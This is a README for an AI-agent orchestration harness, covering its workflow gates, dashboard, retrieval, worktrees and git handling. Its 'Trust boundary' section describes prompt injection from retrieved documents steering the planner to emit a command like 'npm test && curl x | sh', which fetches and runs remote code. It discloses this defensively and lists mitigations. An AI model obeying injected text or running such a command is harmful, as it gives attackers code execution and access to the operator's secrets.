# Agent Harness v2

Agent Harness turns an idea into verified, committed feature slices through a durable state machine. New runs start with a reflect gate (editable restatement), then a grill-me interview in bounded provider episodes. Every invocation still has a complete persisted work packet, so provider history is an optimization rather than a recovery dependency.

## Quick start

Requires **Node.js 20.3+** (`AbortSignal.any` for cancellable agent timeouts).

```bash
npm install
npm run build
npx agent-harness project add --repository "/path/to/your-project"
npx agent-harness ui
```

`project add` registers the repository in harness home (guidance lives there too).
Install Graphify with `uv tool install graphifyy` when you want structural code
retrieval; the harness builds `graphify-out/graph.json` before new runs and after
verified task commits. `init` / `deploy` write a repo-local config when needed.
Use `--no-graphify` on deploy for document-only projects.

The dashboard opens on an authenticated loopback URL and centralizes run creation, human questions, progress, test evidence, session handoffs, artifacts, retries, cancellation, and local knowledge search. Set `CURSOR_API_KEY` for real agent runs. The generated config pins models, commands, retry budgets, TDD policy, git publication, and local knowledge sources.

The lifecycle is:

```text
idea → reflect (editable confirm) → grill-me → verification settings → implementation tickets
     → [RED → GREEN] → command gates → review → commit → pull request
```

The process stops at `awaiting_input`, `blocked`, `cancelled`, or `completed`. It never waits indefinitely: agent calls, shell commands, locks, schema repair, implementation repair, review repair, grill episodes, and per-command advancement are all bounded.

## Commands

```bash
agent-harness ui                              # open the centralized dashboard
agent-harness ui --port 9000 --no-open        # serve locally without opening a browser
agent-harness start --idea "..."              # `run` is an alias
agent-harness start --idea @idea.md --tdd off
agent-harness status --run-id <id> --json
agent-harness answer --run-id <id> --question <id> --text "..."
agent-harness continue --run-id <id>
agent-harness confirm-grill --run-id <id> [--feedback "..."]
agent-harness confirm-verification --run-id <id> [--keep-current] [--test-command "..."]
agent-harness retry --run-id <id> [--force]
agent-harness retry --run-id <id> --max-run-tokens <n> [--force]
agent-harness retry --run-id <id> --max-run-cost-usd <n> [--force]
agent-harness retry --run-id <id> --commit-dirty [order]
agent-harness retry --run-id <id> --accept-tree
agent-harness cancel --run-id <id>            # out-of-band; does not wait on advance
agent-harness unlock --run-id <id> [--repo]   # remove a stale run/repo lock

agent-harness knowledge refresh
agent-harness knowledge add docs/api.md
agent-harness knowledge search "refund ledger"
agent-harness knowledge search "proration" --include-project billing-service
```

`start --tdd on|off` freezes the override into that run's config snapshot. Later commands load the snapshot, so changing the project config cannot silently change an active run.

`retry --force` overrides a non-retriable block (`blockedRetriable: false`). `--max-run-tokens` / `--max-run-cost-usd` rewrite those ceilings on the run's frozen `config.json` (budget blocks still need `--force`). For configuration blocks, use the dashboard's focused config-fixer flow to review and apply a validated repair. `--commit-dirty` commits a dirty tree before retrying; `--accept-tree` re-stamps the working-tree fingerprint after a divergence block.

## Centralized dashboard

The dependency-free browser UI is a read/write client of the same persisted state and engine used by the CLI. It does not keep a competing copy of lifecycle state. Mutating requests are serialized, while polling and artifact reads remain safe during long agent or command work. The top-bar gear opens schema-driven project settings, including test-file glob patterns and the default test command, so each repository can describe its own layout and runner without language-specific harness rules. The test-path editor includes a repository-folder picker that adds the selected folder as a recursive glob. Settings apply to new runs. For a blocked run, the config fixer proposes a minimal, schema-validated repair; the user reviews its affected settings before applying it to the frozen snapshot, which is re-stamped and audited.

Answering a batch is keyboard-driven: `1`–`4` pick an option for the focused question and advance, arrows move between questions, and `Escape` skips one. These fire only when the question container itself holds focus, so typing a digit in the free-text box is never swallowed. "Accept all recommendations" fills every unanswered question with its recommended option but never submits on its own.

Blocked runs key remediation on `blockedKind` (dirty tree, missing agent credential, missing Graphify graph, changed configuration, workspace divergence, provider, budget) with the raw failure kept in a collapsed section. Token/cost ceilings surface a raise-and-retry control. While an agent step is in flight, the header shows live activity from `activity.json` (role, model, elapsed, last step summary). The **Agent activity** tab groups invocations by provider context (with turn badges and an invocation inspector). The run header also shows accrued usage (`total tokens · cached · cost`) against any configured ceiling.

Background polling (~1.8s while the tab is visible) must not feel like a page reload. The server returns a cheap change `signature`, and an unchanged poll short-circuits before any payload is serialized. Focused HITL editors — and half-filled batch cards with no control currently focused — block silent rewrites, and scroll / `<details>` chrome is restored when a silent poll does rewrite the DOM. The full checklist lives in [docs/ui-polling.md](./docs/ui-polling.md).

The server binds only to `127.0.0.1`, generates a fresh access token, rejects unauthenticated API calls, caps request bodies, and restricts artifact and knowledge paths to the configured workspace. Closing the process closes the UI; runs remain recoverable from disk.

## Durable artifacts

Each run lives under `.agent-harness/runs/<runId>/`:

| Artifact | Purpose |
| --- | --- |
| `state.json` | Authoritative state-machine checkpoint |
| `config.json` | Frozen run configuration |
| `events.jsonl` | Append-only transition history |
| `idea.md` | Original operator idea (audit trail) |
| `brief.md` | Confirmed (or draft) feature restatement |
| `grill.md` | Locked grill resolutions |
| `unknowns.md` | Open-unknowns register grouped by status |
| `issues/*.md` | Legacy decision artifacts if present |
| `tasks/*.md` | Tracer-bullet implementation tickets and evidence |
| `packets/*.json` | Complete handoff supplied to one model invocation |
| `sessions/*.json` | Invocation records: role, model, provider context IDs, causal metadata (`invocationKind`, `trigger`), exact submitted prompt, outcome, usage, and handoff summary |
| `sessions/<id>.steps.jsonl` | Bounded, redacted per-step agent activity for one invocation (no raw tool args) |
| `activity.json` | Live in-flight step snapshot; cleared when the invocation settles |
| `cancel.request` | Out-of-band cancel marker; written by `cancel`, consumed by the advancing process |

The map is an index, not a duplicate source of truth. Full decisions live in their issue files. A session loads the map at low resolution and retrieves relevant issue/document chunks on demand.

## Reflect, grill, and human questions

New runs start with a **reflector** that restates the idea and proposes a short feature title. The dashboard renders that draft as a section-wise editor (feature title, goal, users, in/out of scope, assumptions, unknowns); confirming stores the edited brief and starts grilling. The confirmed title is the run label in the sidebar and page header; git branches stay `harness/<runId>` (or `git.branchPrefix/<runId>`). Runs created before structured reflect output fall back to the raw markdown editor.

After confirm, **griller** and **planner** (including project-profiler) treat `reflectBrief.confirmed` as authoritative. The raw idea is reflect-only input and remains on disk as `idea.md` for audit; it is not re-injected into grill/plan work packets or `brief.md`.

The **griller** asks 1–`workflow.grillQuestionsPerBatch` decision-ready HITL questions per turn (context, 2–4 options, recommendation each). The batch size is a **ceiling, not a target**: only mutually independent questions — where one answer would not change how another is phrased — may share a turn, so a genuinely forking decision is still asked alone. The dashboard collects the whole batch and submits it in one transition, so three independent decisions cost one model round-trip instead of three.

`answer` persists the human's exact words plus the selected option id. Questions can be **skipped**, which parks them without producing a resolution. Partial submission is blocked rather than silently auto-parking, since dropping an interview answer implicitly is worse than asking for an explicit skip. The agent never fills in the human side of the exchange.

### The open-unknowns register

Every griller turn also returns what it still needs resolved, including questions it has not asked yet. The harness keeps this as a register on the run state with engine-owned status (`fog` → `asked` → `resolved`, `parked` when the human skips, or `dropped` when a fog entry disappears from the griller's list without an answer). It is seeded from the reflector's `unknowns` before the first question is asked, then re-seeded from the confirmed structured brief so operator edits (adds/removes/renames) are what grilling starts from. It is written to `unknowns.md` and surfaced in the dashboard as "N resolved · N open · N parked · N dropped" — so the interview has an observable length instead of running until the griller happens to stop. `dropped` is neither open nor resolved; an entry that reappears returns to the normal fog/asked/parked path.

Reconciliation is a re-projection, not an append: one answer often collapses several latent unknowns and opens new ones. Entries are never deleted, only transitioned; `parked` is sticky until the griller re-asks, and absence of an `asked` entry becomes `resolved` while absence of fog becomes `dropped`. The register reflects the griller's current judgment; it is not a guarantee that the interview ends after the listed entries.

Operators can also add a **note** mid-interview ("don't touch the auth module") without waiting for a question to attach it to. Notes are consumed as authoritative input on the next griller turn, and can optionally seed a human-authored register entry.

When the griller returns `ready_to_plan`, the run pauses on an explicit **grill-complete gate** (`awaiting_input` with `grillReady`). The dashboard (or `agent-harness confirm-grill`) lets the operator continue into planning or send feedback that reopens grilling with a new fog unknown. Planning does not start until that confirmation.

After grill confirmation and before the planner runs, a **verification settings gate** appears (`awaiting_input` with `verificationReady`). A tools-off `project-profiler` proposes `commands.test` and `workflow.testPathPatterns` from repository evidence; the operator must confirm or edit (optionally also writing project defaults) via the dashboard or `agent-harness confirm-verification` before planning continues.

After verification settings are confirmed, the harness runs the confirmed `commands.test` once as a **verification baseline**. Exit 0 passes; greenfield runners that print “no tests found” / “no test files found” also pass. Real failures, launch errors, and timeouts open an `awaiting_input` gate (`verificationBaselineReady`) with command evidence. Retry via the dashboard or `agent-harness retry-verification-baseline` (optionally editing `commands.test`); the planner does not run until the baseline is acceptable.

The **planner** then produces a **high-level plan** only (problem, solution, approach, constraints, out of scope) — not executable tickets. The run pauses on a **plan review gate** (`awaiting_input` with `planReady`). The dashboard (or `agent-harness confirm-plan`) lets the operator edit and approve the plan, or send feedback that discards it and re-plans. Approving continues on the same retained planner provider session to author a local **PRD** (`prd.md`), then a fresh **`issue-slicer`** agent turns that PRD into `BuildTasks` and optional `proposedInstalls`. There is no extra HITL after PRD or slicing; install approvals (when any) are the next pause before execution.

An episode spans at most `workflow.maxGrillQuestionsPerEpisode` answered questions (five by default), then checkpoints and rolls to a new provider agent with the confirmed brief and resolutions so far. Staleness is measured once per batch from its shared `askedAt`: if a batch is submitted more than `workflow.staleAnswerMinutes` (30 by default) after it was asked, the harness discards the episode and continues with a cold packet containing only those questions and answers. Planning, implementation tasks, and review retain clean boundaries. If the Cursor checkpoint cannot be resumed, the backend creates a fresh agent and submits the complete packet instead.

## Scope-aware local retrieval

The default tracker and knowledge system require no external service. Human-readable issues and tasks are local Markdown. Configured docs, skills, and rules (`.md`, `.mdc`, `.yaml`, and supported source files) are chunked into `.agent-harness/knowledge/documents.json` and `chunks.json`; retrieval uses deterministic lexical scoring and stable tie-breaking.

Semantic retrieval is an opt-in enhancement for documents. When enabled, the harness calls an OpenAI-compatible endpoint or a local Ollama endpoint during indexing, stores vectors alongside the lexical index in `.agent-harness/knowledge/embeddings.json`, and merges lexical and cosine-similarity rankings with reciprocal-rank fusion. Displayed hybrid scores are **normalized RRF** (dual-channel rank-1 ≈ 1.0, single-channel ≈ 0.5), not raw cosine or TF-IDF magnitudes. Semantic-only candidates (no lexical hit) must clear `minSemanticOnlySimilarity` (default 0.45), which is stricter than `minSimilarity` (default 0.3). The key is read only from an environment variable when the chosen provider needs one. Scope and visibility checks happen before vector candidates are ranked, and rules/skills remain on the role- and path-aware guidance path. If the endpoint, credentials, or local vector index are unavailable, search continues with lexical results.

```yaml
knowledge:
  embeddings:
    enabled: true
    # Compatible services can use a different endpoint and model.
    endpoint: https://api.openai.com/v1/embeddings
    model: text-embedding-3-small
    apiKeyEnv: OPENAI_API_KEY
    minSimilarity: 0.3
    minSemanticOnlySimilarity: 0.45
    lexicalWeight: 1
    semanticWeight: 1
```

For fully local embeddings with Ollama, run `packages/agent-harness/scripts/setup-local-embeddings.ps1` on Windows (append `-InstallOllama` to allow a WinGet install) or `packages/agent-harness/scripts/setup-local-embeddings.sh` on macOS/Linux. Both scripts pull `qwen3-embedding` by default, verify the local API, and print the config fragment. `embeddinggemma` and other Ollama embedding models can be selected by passing a model name. Ollama's local embeddings API is served on `http://localhost:11434/api/embed`; it needs no API key.

```yaml
knowledge:
  embeddings:
    enabled: true
    provider: ollama
    endpoint: http://localhost:11434/api/embed
    model: qwen3-embedding
```

Rules (`.mdc`) and skill roots (`SKILL.md`) are classified as guidance and injected into work packets. They are not indexed as searchable knowledge. New configurations contain a complete `assignments` map for every agent role. That map is authoritative: each role receives only the named rules and skills, including explicitly assigned manual-only skills. A same-kind, same-name entry from the active project overrides the global `General/` entry; when no project entry exists, the harness falls back to `General/`. Empty lists intentionally inject no guidance.

Configurations without `assignments` retain the legacy relevance selector for compatibility. It uses the worker role, objective, known paths, rule `globs`, optional front-matter `roles`, and lexical relevance. In legacy mode, `alwaysApply: true` is a ranking priority rather than unconditional prompt injection. Selected excerpts and reasons are persisted in the work packet, and omitted `alwaysApply` rules are recorded in the sibling guidance audit. Guidance is loaded from filesystem roots rather than the document index, so it never appears in generic retrieval.

New runs enable this behavior by default with separate packet budgets: guidance+context, serialized `input`, and a Graphify sub-budget. Guidance itself is capped at 6,000 characters and six entries:

```yaml
workflow:
  contextCharacters: 12000   # guidance + retrieved context
  inputCharacters: 24000     # serialized packet.input
  graphifyCharacters: 3000   # Graphify excerpt within contextCharacters
  reviewDiffCharacters: 12000  # whole-file diff budget for the reviewer packet
  maxRunTokens: 0            # 0 = unlimited; hard stop between steps when exceeded
  maxRunCostUsd: 0           # 0 = unlimited; needs models.pricing for the models in use
  maxProviderRetries: 2      # in-place backoff on provider failures (0–5)
  generateCommitMessages: false  # deterministic per-task subjects; PR body still uses the model
models:
  pricing: {}                # optional: model → { inputPerMillion, outputPerMillion, ... }
knowledge:
  guidance:
    enabled: true
    maxResults: 6
    maxCharacters: 6000
    assignments:
      reflector: { rules: [], skills: [domain-modeling] }
      griller: { rules: [], skills: [grill-me, domain-modeling] }
      planner: { rules: [], skills: [domain-modeling, improve-codebase-architecture] }
      prompt-builder: { rules: [], skills: [] }
      test-writer: { rules: [], skills: [tdd] }
      implementer: { rules: [], skills: [tdd] }
      reviewer: { rules: [], skills: [code-review] }
      message-writer: { rules: [], skills: [] }
      fixer: { rules: [], skills: [diagnose, tdd] }
      config-fixer: { rules: [], skills: [] }
```

Policies such as `no-legacy-fallback-code` are deliberately opt-in. A project that wants the policy adds its name to the relevant role mappings; a project that needs compatibility behavior leaves it out or supplies a project-specific rule under another assigned name.

Every role must appear when `assignments` is present. Assigned entries are not dropped by `maxResults`, although their excerpts still share `maxCharacters` and the overall context budget. A single budget authority (`buildWorkPacket`) applies these ceilings and records truncations beside the retrieval audit. Set `knowledge.guidance.enabled: false` to retain generic retrieval only. Frozen run configurations created before this setting continue with their original retrieval behavior.

Every indexed document has a scope gate: `global` material is always eligible, while `project` material is eligible only for `knowledge.projectId`. A normal query therefore searches the active project's private documents plus any shared/global documents you indexed. Harness rules and skills are not indexed: they are injected from frozen/project/shared guidance roots at packet build time. To include another project's documents, name it with `--include-project`; only documents indexed with `visibility: shared` can cross that boundary. `private` and `restricted` documents are never returned to another project by this local index.

Multiple project configs can point `knowledge.sharedIndexDirectory` at the same directory. Each config supplies its own `projectId` and source classifications, producing one shared index without a default cross-project search path:

```yaml
knowledge:
  projectId: customer-portal
  sharedIndexDirectory: ../shared-rag-index
  sources:
    - path: docs
      scope: project
    - path: shared-guidance
      scope: global
```

Document sources are constrained to the configured repository root. Harness guidance lives under harness home (or a frozen run copy) and is never listed in `knowledge.sources`. A remotely deployed multi-user RAG service must additionally authenticate callers and enforce the same scope filter server-side; the local CLI has no user identity model.

Graphify complements document matches with structural repository traversal. New
harness configs enable it by default. Install Graphify yourself
(`uv tool install graphifyy`). Before the first agent step of each new run
(CLI and UI), the harness verifies the `graphify` command and builds
`graphify-out/graph.json` with `graphify update` when the graph is missing.
After each verified harness task commit that includes a source-file path, it
runs `graphify update` again so the next task receives fresh structural
context. Default Graphify roles are planner, test-writer, implementer, and
reviewer (not reflector/griller). Project-specific
`knowledge.graphify.stopwords` merge over the built-in English and harness-meta
lists. Enable `knowledge.graphify.updateOnRefresh` if a
document-refresh-triggered rebuild is specifically desired. Graphify is invoked
with an argument array rather than a shell, reads only
`graphify-out/graph.json`, and fails softly during later retrieval. Set
`knowledge.graphify.enabled: false` (or deploy with the advanced
`--no-graphify`) for a document-only project.

## Model tiers and handoffs

`models.small` handles optional prompt compilation and commit/PR copy. `models.capable` handles decisions, planning, implementation, and review. Any role can be pinned independently under `models.roles`.

Prompt compilation is disabled by default because the deterministic renderer is already complete. If explicitly enabled and the compiler fails or times out, the harness falls back to that renderer. Grill episodes never invoke the prompt compiler.

## TDD and deterministic evidence

With TDD on, the harness launches a test writer first, restricts its reported/observed paths to tests, runs the declared targeted command, and requires a meaningful non-timeout failure. Only then does it launch the implementer. Failing GREEN or command-gate output is persisted and included in the next implementation packet. With TDD off, implementation starts first but the same targeted test, gate, review, and repair budgets still apply.

Agents cannot claim a command passed. The harness owns process execution and records exit code, stdout, stderr, duration, and timestamp.

## Per-run worktrees

Every new Git-enabled run gets a registered linked worktree under `<stateDirectory>/worktrees/<runId>` (see [ADR 0010](../../docs/adr/0010-per-run-worktrees.md)). The project checkout is the **control root**; the worktree is the **execution root**. Durable harness state (`runs/`, locks, knowledge) stays on the control/state root. Agents, commands, Graphify, and Git mutations for the run use the worktree.

At start the harness resolves `git.baseBranch` to an immutable `baseSha`, runs `git worktree add --detach`, and writes `workspace.json`. No delivery branch is created yet. A human-readable branch is created later at publish from the confirmed feature title plus a short run id. Local task commits are valid on detached `HEAD`.

### Dirty control checkout

A dirty operator checkout is **not** a blocker for ordinary new worktree runs. The run starts from the **committed** base only; uncommitted control-checkout changes are never imported and are **not** warned about at start. Commit changes yourself only if you need those edits in a *future* base (an import-uncommitted operation is deliberately not implemented yet).

`git.autoCommitPreflight` and `git.preflightCommitOrder` apply only to **legacy-shared** runs (no `workspace.json` / pre-worktree resumes). New worktree runs do not offer branch-then-commit / commit-then-branch controls.

### Locking and concurrency

- **Per-run lock** — state/config/workspace mutation for one run.
- **Workspace-admin lock** — short lock around shared Git worktree metadata (add/remove/rename branch refs).
- **Shared-index lock** — knowledge/Graphify refresh coordination.
- **Repository lock** — retained only for **legacy-shared** runs that still mutate the shared checkout.

Independent worktree runs can advance concurrently. Inspect locks with `agent-harness unlock --run-id <id> --inspect-only` (distinguishes run, legacy repository, workspace-admin, and shared-index). `unlock --repo` remains available while legacy runs exist.

### Cleanup, recovery, and disk use

Worktrees share Git objects with the main repo but can accumulate working trees and build artifacts. Cleanup is explicit and conservative:

```bash
agent-harness cleanup --run-id <id>
agent-harness cleanup --run-id <id> --discard   # unpublished commits not on a retained ref
```

Cleanup verifies the recorded path, registration, run id, Git common directory, cleanliness, and publication/discard state before `git worktree remove`. It refuses dirty trees, active/non-settled runs, path mismatches, and unpublished detached history without `--discard`. It never runs `git worktree prune`. Completed published runs keep `workspace.json`, state, events, and the delivery branch; only the worktree directory is removed (`run.worktree_removed`).

If a worktree is missing or moved, resume blocks with a recoverable workspace failure. Manual repair: restore the directory at the recorded path, or recreate a linked worktree at the recorded `baseSha`/`HEAD` with the same path, then resume. Prefer `agent-harness migrate-workspace --run-id <id>` only for clean **legacy-shared** runs.

### Legacy runs

Runs without `workspace.json` reopen as `legacy-shared` with the old repository lock and branch/preflight semantics. Do not silently create a worktree for a dirty legacy run. Explicit migration (`migrate-workspace` / dashboard **Migrate to worktree**) creates a worktree from the current branch/`HEAD` only when the shared tree is clean and emits `run.workspace_migrated`.

## Git ownership

Agents never run git. The harness:

- starts each new Git-enabled run in a detached worktree at the committed base SHA (control checkout branch/index/files are left alone);
- creates a delivery branch only when publication needs a named ref;
- requires every committed path to have been reported by the task worker;
- asks the small model for commit and pull-request text, with a deterministic fallback;
- optionally pushes and opens a pull request with `gh`;
- never auto-merges.

New runs (dashboard **Start from branch**, `POST /api/runs` `baseBranch`, or CLI `--base-branch`) can override the base branch for that run only; the project default remains `git.baseBranch`. The worktree is created immediately when the run starts — the delivery branch is not.

## Trust boundary

The harness executes shell commands in the repository root with the operator's full environment — including secrets such as `CURSOR_API_KEY`. Most of those commands come from config (`commands.test`, `commands.gates[].command`). The exception is `task.testCommand`: the planner authors it, materialization copies it verbatim, and the targeted-test step runs it with `shell: true`. A planner induced (via prompt injection from a retrieved document or a repository file) to emit something like `npm test && curl x | sh` gets arbitrary code execution under the operator's credentials.

Mitigations available today: pin `workflow.tdd`, review planner output before execution, and run the harness in a container or VM when the repository or knowledge index may contain untrusted material.

Intended fix (deferred — see [Command allowlisting for model-authored test targets](../../docs/roadmap.md#command-allowlisting-for-model-authored-test-targets)): allowlist `task.testCommand` against `config.commands.test` and `config.commands.gates[].command`, and model per-task targeting as a scoped `testFilter` argument interpolated into a config-owned template rather than as a free-form command string.

## Testing

From the monorepo root (or `packages/agent-harness`):

```bash
npm run test:unit          # Vitest unit suite
npm run test:integration   # Vitest integration suite (real FS / HTTP / ScriptedBackend)
npm run test:e2e:install   # once per machine: download Chromium for Playwright
npm run test:e2e           # Playwright browser E2E against a real loopback UI
npm run build              # required before acceptance tests that spawn dist/cli.js
npm run test:acceptance    # CLI acceptance via createCli injection + compiled bin
npm run test:all           # unit + integration + e2e + build + acceptance
```

E2E tests live in `tests/e2e/`. They do **not** launch the production CLI: each test builds a `ProjectFixture`, injects a `ScriptedBackend`, starts `startUiServer({ port: 0, openBrowser: false })`, and opens the authenticated dashboard URL. Failure artifacts land under Git-ignored `test-results/` (Playwright traces under `test-results/playwright/`).

Acceptance tests inject backends through `createCli({ createBackend, … })` — there is no production CLI flag or config key that selects a test backend. CI is defined in [`.github/workflows/agent-harness.yml`](../../.github/workflows/agent-harness.yml).

## Extension boundaries

`AgentBackend`, `TrackerPort`, `LocalKnowledgeBase`, and `GitService` are replaceable ports. v2 intentionally ships one Cursor backend and one local tracker first; external trackers and parallel isolated task execution can be added without changing the run artifact contract.
